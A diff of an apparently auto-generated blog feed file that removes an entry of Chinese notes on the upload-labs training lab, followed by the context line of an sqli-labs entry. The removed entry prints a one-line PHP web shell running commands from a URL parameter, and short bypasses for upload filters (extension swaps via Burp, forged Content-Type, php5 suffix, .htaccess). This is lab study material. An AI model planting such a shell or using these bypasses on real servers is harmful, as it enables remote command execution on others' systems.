@@ -73,19 +73,6 @@
   
   
   <entry>
-    <title></title>
-    <link href="/2021/07/23/upload-labs%E5%AD%A6%E4%B9%A0/"/>
-    <url>/2021/07/23/upload-labs%E5%AD%A6%E4%B9%A0/</url>
-    
-    <content type="html"><![CDATA[<h2 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h2><p>编写一句话木马：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure><p>前端验证，改后缀为jpg并上传，然后burp抓包改后缀为php即可</p><p>或者禁用js</p><h2 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h2><p>抓包改Content-Type为image/jpeg</p><h2 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h2><p>过滤了一些后缀，但没有过滤php5，使用php5后缀上传即可</p><h2 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h2><p>过滤了很多后缀，php5、php4、asp等都不能用，但是没有过滤htaccess</p><h3 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h3><p><strong>.htaccess文件(或者”分布式配置文件”）</strong>,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。</p><p>其中</p>]]></content>
-    
-    
-    
-  </entry>
-  
-  
-  
-  <entry>
     <title>sqli-labs学习记录</title>
     <link href="/2021/07/23/sqli-labs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
     <url>/2021/07/23/sqli-labs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
